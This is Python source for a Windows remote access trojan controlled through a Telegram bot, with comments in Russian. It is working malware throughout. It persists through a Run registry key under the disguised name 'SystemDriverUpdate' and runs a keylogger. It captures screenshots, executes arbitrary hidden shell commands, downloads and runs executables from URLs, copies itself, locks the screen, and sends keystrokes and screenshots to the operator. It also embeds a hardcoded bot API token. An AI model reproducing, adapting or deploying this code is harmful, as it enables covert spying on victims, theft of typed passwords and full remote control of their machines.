import telebot
import os
import sys
import time
import subprocess
import threading
import pyautogui
import psutil
import tkinter as tk
import winreg as reg
from telebot import types
import ctypes
import zipfile
import urllib.request
import socket
import keyboard
import io
import shutil

# --- КОНФИГУРАЦИЯ ---
API_TOKEN = '8471615293:AAEqbsdNG2KTVZE5pDVCDDwZAzVlOQ4z-iU'
ADMIN_ID = 6219146434
BOT_VERSION = "11.0 (Fix Buttons & Copy)"

# Инициализация
print(f"--- ЗАПУСК БОТА {BOT_VERSION} ---")
try:
    bot = telebot.TeleBot(API_TOKEN)
except Exception as e:
    print(f"Ошибка инициализации: {e}")

# Глобальные переменные
LOCK_WINDOW = None
REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
REG_NAME = "SystemDriverUpdate"
REG_NAME_KEY = "DeviceFriendlyName"
KEYLOG_BUFFER = []
MAX_BUFFER_SIZE = 50000


# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---

def get_device_name():
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_PATH, 0, reg.KEY_READ)
        try:
            name, _ = reg.QueryValueEx(key, REG_NAME_KEY)
            reg.CloseKey(key)
            return str(name)
        except FileNotFoundError:
            reg.CloseKey(key)
    except:
        pass
    return socket.gethostname()


def set_device_name_reg(new_name):
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_PATH, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(key, REG_NAME_KEY, 0, reg.REG_SZ, str(new_name))
        reg.CloseKey(key)
        return True
    except:
        return False


def escape_html(text):
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def is_admin(message):
    return message.from_user.id == ADMIN_ID


# --- ЛОГИКА ФУНКЦИЙ (ОТДЕЛЕНА ОТ HANDLERS) ---
# Это позволяет вызывать их и из команд, и из кнопок

def logic_send_info(chat_id):
    uptime = time.time() - psutil.boot_time()
    uptime_h = int(uptime // 3600)
    name = escape_html(get_device_name())
    text = (f"👋 <b>{name}</b> на связи!\n"
            f"ℹ️ Версия: <code>{BOT_VERSION}</code>\n"
            f"⏱ Аптайм: {uptime_h}ч\n"
            f"🔒 Блок: {'🔴 ДА' if LOCK_WINDOW else '🟢 Нет'}")
    bot.send_message(chat_id, text, parse_mode='HTML')


def logic_send_procs(chat_id):
    try:
        procs = sorted(psutil.process_iter(['name', 'memory_info']),
                       key=lambda p: p.info['memory_info'].rss, reverse=True)[:15]
        name = escape_html(get_device_name())
        text = f"🖥 <b>Топ процессов ({name}):</b>\n<pre>"
        for p in procs:
            try:
                mb = p.info['memory_info'].rss / 1024 / 1024
                pname = escape_html(p.info['name'])
                text += f"{pname}: {mb:.1f} MB\n"
            except:
                pass
        text += "</pre>"
        bot.send_message(chat_id, text, parse_mode='HTML')
    except Exception as e:
        bot.send_message(chat_id, f"Ошибка получения процессов: {e}")


def logic_shell_command(chat_id, command):
    if not command: return
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, encoding='cp866', errors='replace',
                              creationflags=subprocess.CREATE_NO_WINDOW)
        output = result.stdout + result.stderr
        name = escape_html(get_device_name())
        if not output: output = "✅ Пустой вывод."
        if len(output) > 3500: output = output[:3500] + "\n...(обрезано)"
        safe_output = escape_html(output)
        bot.send_message(chat_id, f"💻 <b>{name}</b>:\n<pre>{safe_output}</pre>", parse_mode='HTML')
    except Exception as e:
        bot.send_message(chat_id, f"Ошибка CMD: {e}")


def logic_send_screen(chat_id):
    try:
        name = escape_html(get_device_name())
        path = f"scr_{int(time.time())}.png"
        pyautogui.screenshot(path)
        with open(path, 'rb') as photo:
            bot.send_photo(chat_id, photo, caption=f"📸 {name}")
        os.remove(path)
    except Exception as e:
        bot.send_message(chat_id, f"Ошибка скриншота: {e}")


# --- СИСТЕМНЫЕ ФУНКЦИИ ---

def add_to_startup(file_path=None):
    if file_path is None: file_path = sys.executable
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_PATH, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(key, REG_NAME, 0, reg.REG_SZ, file_path)
        reg.CloseKey(key)
        return True
    except:
        return False


def remove_from_startup():
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_PATH, 0, reg.KEY_ALL_ACCESS)
        try:
            reg.DeleteValue(key, REG_NAME)
        except:
            pass
        reg.CloseKey(key)
    except:
        return False


def install_local_file(local_path):
    # Логика установки EXE/ZIP
    if local_path.endswith('.zip'):
        try:
            with zipfile.ZipFile(local_path, 'r') as zip_ref:
                exe_files = [f for f in zip_ref.namelist() if f.endswith('.exe')]
                if not exe_files:
                    os.remove(local_path);
                    return
                extracted_path = zip_ref.extract(exe_files[0])
            os.remove(local_path)
            apply_update(extracted_path)
        except:
            if os.path.exists(local_path): os.remove(local_path)
    elif local_path.endswith('.exe'):
        apply_update(local_path)


def apply_update(file_path_src):
    try:
        current_exe = sys.executable
        old_exe = current_exe + ".old"
        if os.path.exists(old_exe):
            try:
                os.remove(old_exe)
            except:
                pass
        os.rename(current_exe, old_exe)
        with open(file_path_src, 'rb') as src, open(current_exe, 'wb') as dst:
            dst.write(src.read())
        try:
            os.remove(file_path_src)
        except:
            pass

        name = escape_html(get_device_name())
        bot.send_message(ADMIN_ID, f"🔄 <b>{name}</b>: Обновлен. Рестарт...", parse_mode='HTML')

        # Запускаем новый и выходим
        subprocess.Popen([current_exe], creationflags=subprocess.CREATE_NO_WINDOW)
        os._exit(0)
    except Exception as e:
        bot.send_message(ADMIN_ID, f"❌ Ошибка обновления: {e}")
        if os.path.exists(old_exe) and not os.path.exists(current_exe):
            os.rename(old_exe, current_exe)


def download_from_url(url, message):
    try:
        filename = url.split('/')[-1].split('?')[0]
        if not (filename.endswith('.exe') or filename.endswith('.zip')): filename = "update.exe"
        temp_path = os.path.join(os.getcwd(), "downloaded_" + filename)
        name = escape_html(get_device_name())
        bot.send_message(ADMIN_ID, f"⏳ <b>{name}</b>: Качаю обновление...", parse_mode='HTML')
        urllib.request.urlretrieve(url, temp_path)
        install_local_file(temp_path)
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")


# --- KEYLOGGER ---
def start_keylogger():
    rus_map = {
        'q': 'й', 'w': 'ц', 'e': 'у', 'r': 'к', 't': 'е', 'y': 'н', 'u': 'г', 'i': 'ш', 'o': 'щ', 'p': 'з', '[': 'х',
        ']': 'ъ',
        'a': 'ф', 's': 'ы', 'd': 'в', 'f': 'а', 'g': 'п', 'h': 'р', 'j': 'о', 'k': 'л', 'l': 'д', ';': 'ж', "'": 'э',
        'z': 'я', 'x': 'ч', 'c': 'с', 'v': 'м', 'b': 'и', 'n': 'т', 'm': 'ь', ',': 'б', '.': 'ю', '/': '.', '`': 'ё'
    }

    def get_layout():
        try:
            user32 = ctypes.windll.user32
            hwnd = user32.GetForegroundWindow()
            thread_id = user32.GetWindowThreadProcessId(hwnd, 0)
            return user32.GetKeyboardLayout(thread_id) & 0xFFFF
        except:
            return 0

    def on_key_event(e):
        global KEYLOG_BUFFER
        try:
            key = e.name
            if key in ['shift', 'right shift', 'ctrl', 'right ctrl', 'alt', 'right alt', 'caps lock', 'menu',
                       'windows']: return
            if get_layout() == 1049 and key in rus_map: key = rus_map[key]
            if key == "space":
                key = " "
            elif key == "enter":
                key = "\n"
            elif key == "decimal":
                key = "."
            elif key == "backspace":
                key = "<"
            elif key == "tab":
                key = " TAB "
            if len(KEYLOG_BUFFER) > MAX_BUFFER_SIZE: del KEYLOG_BUFFER[:1000]
            KEYLOG_BUFFER.append(key)
        except:
            pass

    try:
        keyboard.on_release(on_key_event)
    except:
        pass


# --- БЛОКИРОВКА ---
def fullscreen_lock():
    global LOCK_WINDOW
    LOCK_WINDOW = tk.Tk()
    LOCK_WINDOW.attributes("-fullscreen", True)
    LOCK_WINDOW.attributes("-topmost", True)
    LOCK_WINDOW.configure(background='black')
    LOCK_WINDOW.overrideredirect(True)
    label = tk.Label(LOCK_WINDOW, text=f"{get_device_name()}\nЗАБЛОКИРОВАН", font=("Arial", 40), fg="red", bg="black")
    label.pack(expand=True)
    LOCK_WINDOW.protocol("WM_DELETE_WINDOW", lambda: None)
    LOCK_WINDOW.mainloop()


def start_lock(): threading.Thread(target=fullscreen_lock, daemon=True).start()


def stop_lock():
    global LOCK_WINDOW
    if LOCK_WINDOW:
        LOCK_WINDOW.destroy()
        LOCK_WINDOW = None


# --- COMMAND HANDLERS ---

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if not is_admin(message): return
    add_to_startup()
    name = escape_html(get_device_name())
    text = (f"🤖 <b>Устройство: {name}</b>\n"
            f"ℹ️ Версия: <code>{BOT_VERSION}</code>\n\n"
            "<b>Основные:</b>\n"
            "/panel - 🎛 Главная панель\n"
            "/info - Статус\n"
            "/stop - 🛑 Стоп\n\n"
            "<b>Управление:</b>\n"
            "/lock - Блок | /unlock - Разблок\n"
            "/screen - Скриншот\n"
            "/keyboard - Кейлог\n\n"
            "<b>Система:</b>\n"
            "/procs - Процессы\n"
            "/cs &lt;cmd&gt; - Команда CMD\n"
            "/recopy &lt;путь&gt; - Копировать бота\n"
            f"/setname {name} - Сменить имя\n"
            "/update_url - Обновить\n"
            "/botdelete - ☠️ Удалить")
    bot.reply_to(message, text, parse_mode='HTML')


@bot.message_handler(commands=['stop'])
def stop_bot(message):
    if not is_admin(message): return
    name = escape_html(get_device_name())
    bot.reply_to(message, f"🛑 <b>{name}</b>: Останавливаюсь...", parse_mode='HTML')
    time.sleep(1)
    os._exit(0)


@bot.message_handler(commands=['setname'])
def set_name_cmd(message):
    if not is_admin(message): return
    try:
        # Проверяем, есть ли аргументы
        args = message.text.split(maxsplit=1)
        if len(args) < 2 or not args[1].strip():
            bot.reply_to(message, "⚠️ <b>Ошибка</b>: Имя не указано.\nПример: <code>/setname Саша</code>",
                         parse_mode='HTML')
            return

        new_name = args[1].strip()
        set_device_name_reg(new_name)
        safe_name = escape_html(new_name)
        bot.reply_to(message, f"✅ Имя изменено на: <b>{safe_name}</b>", parse_mode='HTML')
    except:
        pass


@bot.message_handler(commands=['cs'])
def shell_command_handler(message):
    if not is_admin(message): return
    # Проверяем, есть ли аргументы
    command = message.text.replace("/cs", "", 1).strip()
    if not command:
        bot.reply_to(message,
                     "⚠️ <b>Ошибка</b>: Команда не указана.\nПример: <code>/cs ipconfig</code>\nПример: <code>/cs systeminfo</code>",
                     parse_mode='HTML')
        return

    bot.send_chat_action(message.chat.id, 'typing')
    logic_shell_command(message.chat.id, command)


@bot.message_handler(commands=['procs'])
def list_procs_handler(message):
    if not is_admin(message): return
    logic_send_procs(message.chat.id)


@bot.message_handler(commands=['info'])
def info_cmd_handler(message):
    if not is_admin(message): return
    logic_send_info(message.chat.id)


@bot.message_handler(commands=['screen'])
def screen_cmd_handler(message):
    if not is_admin(message): return
    logic_send_screen(message.chat.id)


@bot.message_handler(commands=['recopy'])
def recopy_bot(message):
    if not is_admin(message): return
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2 or not args[1].strip():
            bot.reply_to(message,
                         "⚠️ <b>Ошибка</b>: Путь не указан.\nПример: <code>/recopy D:\\MyFolder\\bot.exe</code>",
                         parse_mode='HTML')
            return

        target_path = args[1].strip()

        # Определяем, что именно копировать
        # Если запущено как EXE, копируем EXE. Если скрипт - скрипт.
        if getattr(sys, 'frozen', False):
            source_file = sys.executable
        else:
            source_file = os.path.abspath(__file__)

        # Если указана папка, добавляем имя файла
        if os.path.isdir(target_path):  # Если путь существует и это папка
            target_path = os.path.join(target_path, os.path.basename(source_file))
        elif target_path.endswith('\\') or target_path.endswith('/'):  # Если путь заканчивается слешем
            target_path = os.path.join(target_path, os.path.basename(source_file))

        # Создаем папку, если ее нет
        folder = os.path.dirname(target_path)
        if folder and not os.path.exists(folder):
            try:
                os.makedirs(folder)
            except:
                pass

        shutil.copy2(source_file, target_path)
        bot.reply_to(message, f"✅ Файл скопирован в:\n<code>{target_path}</code>", parse_mode='HTML')
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка копирования: {e}")


@bot.message_handler(commands=['keyboard'])
def send_keylog(message):
    if not is_admin(message): return
    global KEYLOG_BUFFER
    if KEYLOG_BUFFER:
        try:
            log_content = "".join(KEYLOG_BUFFER)
            file_obj = io.BytesIO(log_content.encode('utf-8'))
            file_obj.name = f"keylog.txt"
            name = escape_html(get_device_name())
            bot.send_document(ADMIN_ID, file_obj, caption=f"⌨️ Лог: <b>{name}</b>", parse_mode='HTML')
            KEYLOG_BUFFER.clear()
            bot.reply_to(message, "✅ Лог отправлен.")
        except Exception as e:
            bot.reply_to(message, f"Ошибка: {e}")
    else:
        bot.reply_to(message, "📭 Лог пуст.")


# --- CALLBACK QUERY HANDLER (ДЛЯ КНОПОК) ---
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.from_user.id != ADMIN_ID: return
    name = get_device_name()
    safe_name = escape_html(name)
    chat_id = call.message.chat.id

    # ГЛАВНОЕ МЕНЮ
    if call.data == "open_menu":
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("🔒 Блок", callback_data="do_lock"),
            types.InlineKeyboardButton("🔓 Разблок", callback_data="do_unlock"),
            types.InlineKeyboardButton("📸 Скрин", callback_data="do_screen"),
            types.InlineKeyboardButton("⌨️ Лог", callback_data="do_keylog"),
            types.InlineKeyboardButton("🖥 Процессы", callback_data="do_procs"),
            types.InlineKeyboardButton("ℹ️ Инфо", callback_data="do_info"),
            types.InlineKeyboardButton("💻 CMD Меню", callback_data="open_cmd_menu"),
            types.InlineKeyboardButton("🛑 Стоп", callback_data="do_stop"),
            types.InlineKeyboardButton("🔙 Скрыть", callback_data="close_menu")
        )
        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                              text=f"⚙️ <b>Меню: {safe_name}</b>", reply_markup=markup, parse_mode='HTML')

    # CMD МЕНЮ
    elif call.data == "open_cmd_menu":
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("🌐 IP Config", callback_data="cmd_ipconfig"),
            types.InlineKeyboardButton("📊 Netstat", callback_data="cmd_netstat"),
            types.InlineKeyboardButton("ℹ️ SysInfo", callback_data="cmd_sysinfo"),
            types.InlineKeyboardButton("📋 Tasklist", callback_data="cmd_tasklist"),
            types.InlineKeyboardButton("🔙 Назад", callback_data="open_menu")
        )
        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                              text=f"💻 <b>CMD Команды: {safe_name}</b>", reply_markup=markup, parse_mode='HTML')

    elif call.data == "close_menu":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton(f"🔧 Настроить: {name}", callback_data="open_menu"))
        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                              text=f"🎛 Панель: <b>{safe_name}</b>", reply_markup=markup, parse_mode='HTML')

    # ДЕЙСТВИЯ (ТЕПЕРЬ ВЫЗЫВАЮТ ОБЩИЕ ФУНКЦИИ)
    elif call.data == "do_lock":
        start_lock()
        bot.answer_callback_query(call.id, "Блок")
    elif call.data == "do_unlock":
        stop_lock()
        bot.answer_callback_query(call.id, "Разблок")
    elif call.data == "do_screen":
        bot.answer_callback_query(call.id, "Скрин...")
        logic_send_screen(chat_id)
    elif call.data == "do_keylog":
        bot.answer_callback_query(call.id, "Лог...")
        if KEYLOG_BUFFER:
            try:
                log_content = "".join(KEYLOG_BUFFER)
                file_obj = io.BytesIO(log_content.encode('utf-8'))
                file_obj.name = f"keylog.txt"
                bot.send_document(chat_id, file_obj, caption=f"⌨️ {name}")
                KEYLOG_BUFFER.clear()
            except:
                pass
        else:
            bot.send_message(chat_id, f"📭 Лог пуст ({name})")

    elif call.data == "do_info":
        bot.answer_callback_query(call.id, "Инфо")
        logic_send_info(chat_id)
    elif call.data == "do_procs":
        bot.answer_callback_query(call.id, "Процессы")
        logic_send_procs(chat_id)
    elif call.data == "do_stop":
        bot.answer_callback_query(call.id, "Остановка...")
        stop_bot(call.message)

    # КОМАНДЫ CMD
    elif call.data == "cmd_ipconfig":
        bot.answer_callback_query(call.id, "ipconfig")
        logic_shell_command(chat_id, "ipconfig")
    elif call.data == "cmd_netstat":
        bot.answer_callback_query(call.id, "netstat")
        logic_shell_command(chat_id, "netstat -an")
    elif call.data == "cmd_sysinfo":
        bot.answer_callback_query(call.id, "systeminfo")
        logic_shell_command(chat_id, "systeminfo")
    elif call.data == "cmd_tasklist":
        bot.answer_callback_query(call.id, "tasklist")
        logic_shell_command(chat_id, "tasklist")


# ОСТАЛЬНЫЕ КОМАНДЫ (Rename, Update)
@bot.message_handler(commands=['update_url'])
def update_via_link(message):
    if not is_admin(message): return
    try:
        url = message.text.split(maxsplit=1)[1].strip()
        name = escape_html(get_device_name())
        bot.reply_to(message, f"⬇️ <b>{name}</b>: Качаю...", parse_mode='HTML')
        threading.Thread(target=download_from_url, args=(url, message)).start()
    except:
        pass


@bot.message_handler(commands=['panel'])
def panel_cmd(message):
    if not is_admin(message): return
    markup = types.InlineKeyboardMarkup()
    name = get_device_name()
    btn = types.InlineKeyboardButton(f"🔧 Настроить: {name}", callback_data="open_menu")
    markup.add(btn)
    safe_name = escape_html(name)
    bot.send_message(message.chat.id, f"🎛 Панель: <b>{safe_name}</b>", reply_markup=markup, parse_mode='HTML')


@bot.message_handler(commands=['rename'])
def rename_bot_file(message):
    if not is_admin(message): return
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            bot.reply_to(message, "⚠️ Пример: <code>/rename service.exe</code>", parse_mode='HTML')
            return

        new_name = args[1].strip()
        if not new_name.lower().endswith(".exe"): new_name += ".exe"

        current_path = sys.executable
        folder = os.path.dirname(current_path)
        new_path = os.path.join(folder, new_name)

        if os.path.exists(new_path):
            bot.reply_to(message, "❌ Файл с таким именем уже существует.")
            return

        os.rename(current_path, new_path)
        remove_from_startup()
        add_to_startup(new_path)

        name = escape_html(get_device_name())
        bot.reply_to(message, f"✅ <b>{name}</b>: Переименован в <code>{new_name}</code>. Рестарт...", parse_mode='HTML')

        subprocess.Popen([new_path], creationflags=subprocess.CREATE_NO_WINDOW)
        os._exit(0)

    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")


@bot.message_handler(commands=['bot_delete', 'botdelete'])
def bot_self_destruct(message):
    if not is_admin(message): return
    name = escape_html(get_device_name())
    msg = bot.reply_to(message, f"⚠️ <b>{name}</b>: Напишите <code>CONFIRM</code> для удаления.", parse_mode='HTML')
    bot.register_next_step_handler(msg, process_destruct_confirmation)


def process_destruct_confirmation(message):
    if not is_admin(message): return
    if message.text.strip() == "CONFIRM":
        name = escape_html(get_device_name())
        bot.reply_to(message, f"💥 <b>{name}</b>: Удаляюсь...", parse_mode='HTML')
        remove_from_startup()
        current_exe = sys.executable
        batch_file = "killer.bat"
        bat_content = f"""@echo off
:loop
ping 127.0.0.1 -n 2 > nul
del /f /q "{current_exe}"
if exist "{current_exe}" goto loop
del "%~f0"
"""
        try:
            with open(batch_file, "w") as f:
                f.write(bat_content)
            subprocess.Popen(batch_file, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass
        os._exit(0)


@bot.message_handler(content_types=['document'])
def handle_docs(message):
    if not is_admin(message): return
    is_exe = message.document.file_name.lower().endswith('.exe')
    is_zip = message.document.file_name.lower().endswith('.zip')
    if is_exe or is_zip:
        try:
            name = escape_html(get_device_name())
            bot.reply_to(message, f"⬇️ <b>{name}</b>: Получил файл...", parse_mode='HTML')
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            temp_filename = f"temp_upd_{int(time.time())}" + os.path.splitext(message.document.file_name)[1]
            with open(temp_filename, 'wb') as new_file:
                new_file.write(downloaded_file)
            install_local_file(temp_filename)
        except Exception as e:
            if "file is too big" in str(e): bot.reply_to(message, "❌ Файл >20МБ. Шлите ZIP или ссылку.")


if __name__ == "__main__":
    add_to_startup()
    try:
        old_exe = sys.executable + ".old"
        if os.path.exists(old_exe):
            time.sleep(1)
            try:
                os.remove(old_exe)
            except:
                pass
    except:
        pass
    start_keylogger()
    try:
        name = escape_html(get_device_name())
        bot.send_message(ADMIN_ID, f"🟢 <b>{name}</b>: Запущен!\nВерсия: <code>{BOT_VERSION}</code>", parse_mode='HTML')
    except:
        pass
    print("Бот готов.")
    while True:
        try:
            bot.polling(none_stop=True, interval=2)
        except:
            time.sleep(5)